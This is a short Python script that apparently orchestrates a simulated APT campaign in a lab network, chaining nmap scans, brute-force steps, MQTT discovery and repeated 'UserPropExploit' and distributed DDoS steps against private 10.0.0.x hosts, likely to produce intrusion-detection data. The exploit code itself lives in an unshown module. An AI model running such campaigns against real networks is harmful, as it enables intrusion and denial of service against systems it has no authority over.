from APT import *

step_seq = [(NetstatStep(5), 2), (Nmap192T5Step(10), 2), (PauseStep(80), 1),
            (Nmap10T5Step(10), 4), (PauseStep(70), 1), (BruteForceStep(10),), (BruteForceStep(10, action='t'),),
            (NmapMQTTDiscStep("10.0.0.5"), 1), (NmapSubDiscStep("10.0.0.5", pause=10), 10),
            (NmapBannerDiscStep("10.0.0.5", pause=10), 5), (PauseStep(80), 1),
            (UserPropExploit("10.0.0.5", "client3", "pass3", duration=1000, number=1000), 3),
            (PauseStep(100), 1), (Nmap10T5Step(3), 5), (BruteForceStep(2.5, action='t'), 2),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 30,
                                UserPropExploit("", "client1", "pass1", duration=3600, number=2000, pause=10)),),
            (PauseStep(100), 2),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=100, duration=180, pause=5), 20),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=400, duration=50), 30),
            (UserPropExploit("10.0.0.5", "client1", "pass1", duration=1800, number=18000), 4),
            (PauseStep(60), 1), (Nmap10T5Step(3), 5), (BruteForceStep(2.5, action='t'),), (PauseStep(180), 1),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 20,
                                UserPropExploit("", "client1", "pass1", duration=5000, number=100000, pause=2)), 2),
            (PauseStep(100), 2),
            (UserPropExploit("10.0.0.15", "client2", "pass2", number=100, duration=200, pause=5), 20),
            (UserPropExploit("10.0.0.5", "client1", "pass1", duration=2000, number=20000), 5),
            (UserPropExploit("10.0.0.6", "client1", "pass1", duration=100, number=1000), 20),
            (Nmap10T5Step(3), 2), (BruteForceStep(2.5),), (PauseStep(80), 1),
            (DistributedExploit(["10.0.0.4", "10.0.0.5", "10.0.0.7", "10.0.0.6", "10.0.0.8", "10.0.0.9"], 10,
                                UserPropExploit("", "client1", "pass1", duration=600, number=50000, pause=20)),),
            ]
exp_details = []
atk = APTAttack(step_seq, "user_prop_ddos_camp_test", exp_details, "/output/experiment_details.pkl")
atk.run()
atk.save_in()
